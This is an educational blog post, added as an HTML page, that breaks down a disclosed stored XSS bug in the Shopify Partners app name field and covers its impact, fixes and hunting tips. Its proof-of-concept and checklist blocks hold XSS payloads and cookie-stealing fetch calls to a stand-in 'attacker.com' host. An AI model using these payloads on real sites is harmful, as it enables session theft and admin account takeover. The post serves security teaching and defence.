@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Stored XSS on Shopify Partners — HackerOne #125027. How unsanitised input in a partner app's name field allowed persistent script injection across every admin session that loaded the app listing." />
+  <title>Stored XSS via App Name on Shopify Partners — HackerOne #125027 | Blog — Darshak Patel</title>
+  <link rel="stylesheet" href="../../assets/css/style.css" />
+  <link rel="stylesheet" href="../../assets/css/pages/post.css" />
+</head>
+<body>
+
+<div class="read-progress" id="read-progress"></div>
+<canvas id="particles"></canvas>
+
+<nav>
+  <a href="../../index.html" class="nav-logo">
+    <span class="bracket">[</span>dp<span class="bracket">]</span>
+  </a>
+  <ul class="nav-links">
+    <li><a href="../../pages/about.html">about</a></li>
+    <li><a href="../../pages/expertise.html">expertise</a></li>
+    <li><a href="../../pages/certifications.html">certifications</a></li>
+    <li><a href="../../pages/achievements.html">achievements</a></li>
+    <li><a href="../../pages/tools.html">tools</a></li>
+    <li><a href="../../pages/resources.html">resources</a></li>
+    <li><a href="../index.html" class="active">blog</a></li>
+    <li><a href="../../pages/contact.html">contact</a></li>
+  </ul>
+  <a href="mailto:your@email.com" class="nav-cta">Hire Me</a>
+  <div class="nav-hamburger" aria-label="menu">
+    <span></span><span></span><span></span>
+  </div>
+</nav>
+
+<div class="post-wrap">
+
+  <!-- ── Hero ── -->
+  <div class="post-hero" data-vuln="xss">
+    <div class="post-hero-inner">
+      <a href="../index.html" class="post-back">← Back to Blog</a>
+      <div class="post-vuln-badge">⬡ XSS</div>
+      <div class="post-meta">
+        <span class="post-tag">Bug Bounty</span>
+        <span class="post-tag">Web App</span>
+        <span class="post-tag">Stored XSS</span>
+        <span class="post-tag" data-sev="high">High</span>
+        <span class="post-meta-sep">·</span>
+        <span>Jun 23, 2025</span>
+        <span class="post-meta-sep">·</span>
+        <span>7 min read</span>
+      </div>
+      <h1 class="post-h1">Stored XSS via App Name Field on Shopify Partners — HackerOne #125027</h1>
+      <p class="post-sub">How registering a Shopify Partner app with a crafted name like <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> caused that payload to execute in the browser of every Shopify admin who viewed the app listing — a classic stored (persistent) XSS with session-hijacking potential.</p>
+      <div class="post-stats">
+        <div class="post-stat">
+          <span class="post-stat-label">Program</span>
+          <span class="post-stat-value">Shopify</span>
+        </div>
+        <div class="post-stat">
+          <span class="post-stat-label">Report</span>
+          <span class="post-stat-value">#125027</span>
+        </div>
+        <div class="post-stat">
+          <span class="post-stat-label">Severity</span>
+          <span class="post-stat-value">High</span>
+        </div>
+        <div class="post-stat">
+          <span class="post-stat-label">Weakness</span>
+          <span class="post-stat-value">Stored XSS (CWE-79)</span>
+        </div>
+        <div class="post-stat">
+          <span class="post-stat-label">Status</span>
+          <span class="post-stat-value">Resolved</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── Source + Attribution ── -->
+  <div class="post-body">
+    <a href="https://hackerone.com/reports/125027" target="_blank" rel="noopener" class="post-source">
+      ↗ HackerOne Report #125027 — Shopify
+    </a>
+    <p class="post-attr">Independent educational breakdown of a publicly disclosed report. Credit for the original finding belongs to its researcher.</p>
+  </div>
+
+  <div class="post-layout">
+
+    <aside class="post-toc">
+      <div class="toc-label">Contents</div>
+      <ul class="toc-list">
+        <li><a href="#what">What Is Stored XSS?</a></li>
+        <li><a href="#context">The Target</a></li>
+        <li><a href="#bug">The Bug</a></li>
+        <li><a href="#poc">Proof of Concept</a></li>
+        <li><a href="#impact">Impact</a></li>
+        <li><a href="#fix">The Fix</a></li>
+        <li><a href="#hunting">How to Hunt It</a></li>
+        <li><a href="#refs">References</a></li>
+      </ul>
+    </aside>
+
+    <article class="post-article">
+
+      <h2 id="what">What Is Stored XSS?</h2>
+      <p><strong>Cross-Site Scripting (XSS)</strong> is a vulnerability where an attacker injects malicious scripts into a web page that are then executed in the browser of other users. There are three main types:</p>
+      <ul>
+        <li><strong>Reflected XSS</strong> — the payload is embedded in a URL and executed immediately when the victim clicks it. It is not persisted on the server.</li>
+        <li><strong>Stored (Persistent) XSS</strong> — the payload is saved to the server (database, file, log) and re-served to every user who views the affected page. <em>This is the type in this report.</em></li>
+        <li><strong>DOM-based XSS</strong> — the payload is injected and executed entirely in the browser via insecure client-side JavaScript, without the server ever seeing the payload.</li>
+      </ul>
+      <p>Stored XSS is the most impactful of the three because a single submission can affect every subsequent visitor — including high-privilege users like administrators.</p>
+      <div class="post-note">Stored XSS in an admin context is often rated High or Critical, because the attacker can steal admin session cookies, perform privileged actions on behalf of admins, or pivot to further compromise the platform.</div>
+
+      <h2 id="context">The Target — Shopify Partner Dashboard</h2>
+      <p><strong>Shopify Partners</strong> is the developer and agency program through which third parties build apps for the Shopify App Store. A partner can register a new app, giving it a name, description, URLs, and other metadata. This metadata is then displayed inside the Shopify admin interface for merchants who install the app, and inside Shopify's internal tools for employees who review app submissions.</p>
+      <p>Because the app name appears in contexts reviewed by Shopify admins, unsanitised input there is a high-value stored XSS surface: the attacker (the malicious partner) never has admin access themselves, but their payload runs <em>in the browser of every admin</em> who views the listing.</p>
+
+      <h2 id="bug">The Bug</h2>
+      <p>The <strong>app name field</strong> on the Shopify Partner dashboard accepted arbitrary HTML and JavaScript without sanitisation or encoding. When a partner submitted a new app with a name containing a script tag, Shopify stored the raw string in its database and reflected it unescaped into the HTML of the app listing page.</p>
+
+      <div class="post-code">
+        <div class="post-code-header">
+          <div class="post-code-dots"><span></span><span></span><span></span></div>
+          <span class="post-code-label">The injected app name and its rendered output</span>
+        </div>
+        <pre><code><span class="cc"># Partner submits a new app with a crafted name:</span>
+<span class="cv">App Name:</span>  <span class="ch">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span>
+
+<span class="cc"># Shopify stores this string and later renders it in the listing page:</span>
+<span class="ck">&lt;div</span> <span class="cv">class</span>=<span class="cs">"app-name"</span><span class="ck">&gt;</span>
+  <span class="ch">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span>   <span class="cc">← raw, unescaped</span>
+<span class="ck">&lt;/div&gt;</span>
+
+<span class="cc"># What it SHOULD look like (properly HTML-encoded):</span>
+<span class="ck">&lt;div</span> <span class="cv">class</span>=<span class="cs">"app-name"</span><span class="ck">&gt;</span>
+  <span class="cok">&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;</span>  <span class="cc">← safe, rendered as text</span>
+<span class="ck">&lt;/div&gt;</span></code></pre>
+      </div>
+
+      <p>The app name was reflected without HTML-encoding in at least two locations:</p>
+      <ul>
+        <li>The app listing inside the <strong>Shopify admin interface</strong> — visible to any Shopify merchant who had the app installed.</li>
+        <li>The <strong>Partner dashboard</strong> itself — visible to Shopify employees during app review and to the partner who created the app.</li>
+      </ul>
+
+      <div class="post-note" data-type="warn"><strong>No user interaction beyond the initial setup is required.</strong> Once the malicious app is submitted and stored, the script runs automatically every time any affected page loads — no further action from the attacker is needed. This is what makes stored XSS fundamentally more dangerous than reflected XSS.</div>
+
+      <h2 id="poc">Proof of Concept</h2>
+      <p>Steps to reproduce (as documented in the report):</p>
+      <ul>
+        <li><strong>1.</strong> Create a Shopify Partners account (free, requires a business email).</li>
+        <li><strong>2.</strong> Navigate to <strong>Apps → Create app</strong> in the Partner dashboard.</li>
+        <li><strong>3.</strong> In the <strong>App name</strong> field, enter a script payload:</li>
+      </ul>
+
+      <div class="post-code">
+        <div class="post-code-header">
+          <div class="post-code-dots"><span></span><span></span><span></span></div>
+          <span class="post-code-label">Proof-of-concept payload</span>
+        </div>
+        <pre><code><span class="cc"># Basic alert PoC (demonstrates execution):</span>
+<span class="ch">&lt;script&gt;alert(1)&lt;/script&gt;</span>
+
+<span class="cc"># Cookie-stealing payload (demonstrates session hijack risk):</span>
+<span class="ch">&lt;script&gt;</span>
+  <span class="cf">fetch</span>(<span class="cs">'https://attacker.com/steal?c='</span> + <span class="cf">encodeURIComponent</span>(<span class="cv">document.cookie</span>));
+<span class="ch">&lt;/script&gt;</span>
+
+<span class="cc"># img-based fallback (if script tags are filtered but img onerror is not):</span>
+<span class="ch">&lt;img src=x onerror="alert(document.cookie)"&gt;</span></code></pre>
+      </div>
+
+      <ul>
+        <li><strong>4.</strong> Save the app. The name is persisted to Shopify's database.</li>
+        <li><strong>5.</strong> Open the app listing — either from the Partner dashboard or from an admin account that has the app installed.</li>
+        <li><strong>6.</strong> The script executes immediately in the browser. An alert dialog pops up showing the current session cookies.</li>
+      </ul>
+
+      <div class="post-note"><strong>No special privileges needed to plant the payload.</strong> A Partner account is free to create. Any person with a browser and an email address can register as a Shopify Partner and submit an app. The attacker never needs access to a merchant or admin account — they just create the trap and wait for an admin to walk into it.</div>
+
+      <h2 id="impact">Impact</h2>
+      <ul>
+        <li><strong>Session cookie theft</strong> — if the session cookie is not marked <code>HttpOnly</code>, the attacker's payload can exfiltrate it to a remote server. With the cookie, the attacker can fully impersonate the admin without knowing their password.</li>
+        <li><strong>Admin account takeover</strong> — even with <code>HttpOnly</code> cookies, an attacker can use XSS to perform any action the victim admin could: change settings, exfiltrate data, create new admin users, etc.</li>
+        <li><strong>Merchant data exposure</strong> — Shopify admins have access to store orders, customer PII, payment information, and business analytics. An XSS payload running in their browser can silently harvest all of this.</li>
+        <li><strong>Persistent, no user interaction required</strong> — once planted, the payload fires on every page load for every affected user. Unlike phishing, there is no "don't click the link" defence.</li>
+        <li><strong>Supply-chain trust abuse</strong> — the malicious app passes through Shopify's app review process. If reviewers load the listing as part of their review workflow, the payload also fires in their browser.</li>
+        <li><strong>Scale</strong> — a high-install app could expose hundreds of thousands of Shopify merchants, each having their admin session silently compromised on every visit.</li>
+      </ul>
+
+      <h2 id="fix">The Fix</h2>
+      <p>The root cause is output encoding failure: user-supplied strings are inserted directly into an HTML context without being encoded. The fix is straightforward:</p>
+
+      <div class="post-code">
+        <div class="post-code-header">
+          <div class="post-code-dots"><span></span><span></span><span></span></div>
+          <span class="post-code-label">Output encoding — the correct pattern</span>
+        </div>
+        <pre><code><span class="cc"># Vulnerable — raw string interpolated into HTML template:</span>
+<span class="ck">&lt;div</span> <span class="cv">class</span>=<span class="cs">"app-name"</span><span class="ck">&gt;</span>{{ app.name }}<span class="ck">&lt;/div&gt;</span>
+<span class="cc"># If app.name = '&lt;script&gt;...&lt;/script&gt;', the script executes.</span>
+
+<span class="cc"># Secure — HTML-encode all dynamic output before insertion:</span>
+<span class="ck">&lt;div</span> <span class="cv">class</span>=<span class="cs">"app-name"</span><span class="ck">&gt;</span>{{ app.name | <span class="cf">html_escape</span> }}<span class="ck">&lt;/div&gt;</span>
+<span class="cc"># Renders: &amp;lt;script&amp;gt;...&amp;lt;/script&amp;gt; — shown as text, not executed.</span>
+
+<span class="cc"># Additionally — validate and restrict the app name at input time:</span>
+<span class="cv">def</span> <span class="cf">validate_app_name</span>(name):
+    <span class="ck">if</span> len(name) &gt; 100:
+        <span class="ck">raise</span> ValidationError(<span class="cs">"App name too long"</span>)
+    <span class="ck">if</span> re.<span class="cf">search</span>(<span class="cs">r'[&lt;&gt;"\'`]'</span>, name):
+        <span class="ck">raise</span> ValidationError(<span class="cs">"App name contains disallowed characters"</span>)
+    <span class="ck">return</span> name.<span class="cf">strip</span>()</code></pre>
+      </div>
+
+      <ul>
+        <li><strong>HTML-encode all output</strong> — every string from user input or the database must be HTML-escaped before insertion into an HTML context. Characters <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, <code>"</code>, and <code>'</code> must be replaced with their HTML entities.</li>
+        <li><strong>Apply a Content Security Policy (CSP)</strong> — a strict CSP (<code>script-src 'self'</code>) prevents inline scripts from executing even if encoding is missed, providing a second line of defence.</li>
+        <li><strong>Set <code>HttpOnly</code> and <code>Secure</code> on session cookies</strong> — this doesn't prevent XSS execution, but it prevents the most direct consequence (cookie theft via <code>document.cookie</code>).</li>
+        <li><strong>Input validation at write time</strong> — reject or strip HTML-special characters in fields that should never contain markup (e.g. app names, organisation names, usernames).</li>
+      </ul>
+
+      <h2 id="hunting">How to Hunt Stored XSS in Developer/Partner Portals</h2>
+      <ul>
+        <li><strong>Every text input that is displayed to other users is a target.</strong> App names, descriptions, organisation names, profile bios, product titles, support ticket subjects — anything a user types and another user reads is a potential stored XSS sink.</li>
+        <li><strong>Pay special attention to inputs shown in privileged contexts.</strong> If your input is displayed to an admin, a reviewer, or a support agent, the impact is dramatically higher. Prioritise these surfaces.</li>
+        <li><strong>Test all rendering contexts.</strong> The same value might be safe in one context (e.g. a React component that auto-escapes) and unsafe in another (e.g. an internal admin tool built quickly without the same framework). Submit once, check everywhere the value appears.</li>
+        <li><strong>Use a canary string first.</strong> Before throwing raw script tags at a field, start with a benign unique string like <code>xss-probe-1234&lt;"'&gt;</code>. View source on the output page. If the characters appear unencoded, you have a confirmed injection point — then escalate to a full payload.</li>
+        <li><strong>Check rich-text fields carefully.</strong> Markdown editors, WYSIWYG editors, and HTML-accepting fields are high-risk surfaces. Even if the frontend strips tags on display, the raw value stored in the database may be served differently in other contexts (e.g. API responses, PDF exports, email notifications).</li>
+        <li><strong>Test SVG uploads.</strong> SVG files are XML-based and can contain inline <code>&lt;script&gt;</code> tags. If a platform allows SVG uploads and serves them inline (not as a download), each upload is a potential stored XSS vector.</li>
+      </ul>
+
+      <div class="post-code">
+        <div class="post-code-header">
+          <div class="post-code-dots"><span></span><span></span><span></span></div>
+          <span class="post-code-label">Stored XSS hunting checklist</span>
+        </div>
+        <pre><code><span class="cc"># Step 1 — Find all user inputs that appear in other users' views</span>
+<span class="cv">Inputs to check:</span>  profile name, bio, app name, org name, ticket title,
+                   product description, file name, comment body, ...
+
+<span class="cc"># Step 2 — Submit a canary to detect lack of encoding</span>
+<span class="ch">xss-&lt;"'&gt;-canary</span>
+<span class="cc"># View source: are the characters &lt;, ", ', &gt; encoded as &amp;lt; &amp;quot; etc?</span>
+<span class="cc"># If NOT — injection point confirmed.</span>
+
+<span class="cc"># Step 3 — Escalate to a PoC payload</span>
+<span class="ch">&lt;script&gt;alert(document.domain)&lt;/script&gt;</span>
+<span class="ch">&lt;img src=x onerror=alert(1)&gt;</span>
+<span class="ch">&lt;svg onload=alert(1)&gt;</span>
+
+<span class="cc"># Step 4 — Check every view where the value renders:</span>
+<span class="cc">#   - Your own dashboard</span>
+<span class="cc">#   - Other users' views (switch accounts)</span>
+<span class="cc">#   - Admin / reviewer UI (if accessible)</span>
+<span class="cc">#   - Email notifications (HTML emails)</span>
+<span class="cc">#   - API responses (may be used by other frontends)</span>
+
+<span class="cc"># Step 5 — Confirm impact: does document.cookie return session tokens?</span>
+<span class="ck">fetch</span>(<span class="cs">'https://attacker.com/?'</span> + <span class="cf">btoa</span>(<span class="cv">document.cookie</span>))</code></pre>
+      </div>
+
+      <div class="post-note" data-type="tip"><strong>Why partner/developer portals are high-value XSS targets:</strong> they are often built by smaller teams with less security scrutiny than the main product, they grant access to admin-level review workflows, and the attacker's entry point (creating an account) is intentionally open to the public. A single field on a partner registration form can give an attacker a persistent foothold in an admin's browser.</div>
+
+      <hr class="post-divider" />
+
+      <h2 id="refs">References</h2>
+      <ul class="post-refs">
+        <li><a href="https://hackerone.com/reports/125027" target="_blank" rel="noopener">[1] HackerOne Report #125027 — Stored XSS via app name on Shopify Partners</a></li>
+        <li><a href="https://owasp.org/www-community/attacks/xss/" target="_blank" rel="noopener">[2] OWASP — Cross-Site Scripting (XSS)</a></li>
+        <li><a href="https://portswigger.net/web-security/cross-site-scripting/stored" target="_blank" rel="noopener">[3] PortSwigger — Stored XSS</a></li>
+        <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener">[4] OWASP — XSS Prevention Cheat Sheet</a></li>
+        <li><a href="https://content-security-policy.com/" target="_blank" rel="noopener">[5] Content Security Policy Reference</a></li>
+      </ul>
+
+      <div class="post-nav">
+        <a href="./blog-h1-1679276-idor-mailpoet-currency.html" class="post-nav-link">
+          <span class="post-nav-dir">← Previous Post</span>
+          <span class="post-nav-title">IDOR: Currency Manipulation on MailPoet #1679276</span>
+        </a>
+        <a href="../index.html" class="post-nav-link next">
+          <span class="post-nav-dir">All Posts →</span>
+          <span class="post-nav-title">Back to Blog Index</span>
+        </a>
+      </div>
+
+    </article>
+  </div>
+
+</div>
+
+<footer>
+  <p>© 2025 <span class="f-name">Darshak Patel</span> · B.Tech CSE Cybersecurity</p>
+  <div class="f-links">
+    <a href="../../index.html">Home</a>
+    <a href="../../pages/about.html">About</a>
+    <a href="../../pages/expertise.html">Expertise</a>
+    <a href="../../pages/certifications.html">Certifications</a>
+    <a href="../../pages/achievements.html">Achievements</a>
+    <a href="../../pages/tools.html">Tools</a>
+    <a href="../../pages/resources.html">Resources</a>
+    <a href="../index.html">Blog</a>
+    <a href="../../pages/contact.html">Contact</a>
+  </div>
+</footer>
+
+<script src="../../assets/js/main.js"></script>
+<script>
+  (function () {
+    const bar = document.getElementById('read-progress');
+    function update() {
+      const h = document.documentElement;
+      const pct = (h.scrollTop / (h.scrollHeight - h.clientHeight)) * 100;
+      bar.style.width = Math.min(pct, 100) + '%';
+    }
+    window.addEventListener('scroll', update, { passive: true });
+    update();
+  })();
+  (function () {
+    const links = document.querySelectorAll('.toc-list a');
+    const headings = Array.from(document.querySelectorAll('.post-article h2[id]'));
+    if (!links.length || !headings.length) return;
+    function onScroll() {
+      const top = window.scrollY + 100;
+      let active = headings[0];
+      for (const h of headings) { if (h.offsetTop <= top) active = h; }
+      links.forEach(l => l.classList.toggle('active', l.getAttribute('href') === '#' + active.id));
+    }
+    window.addEventListener('scroll', onScroll, { passive: true });
+    onScroll();
+  })();
+</script>
+</body>
+</html>
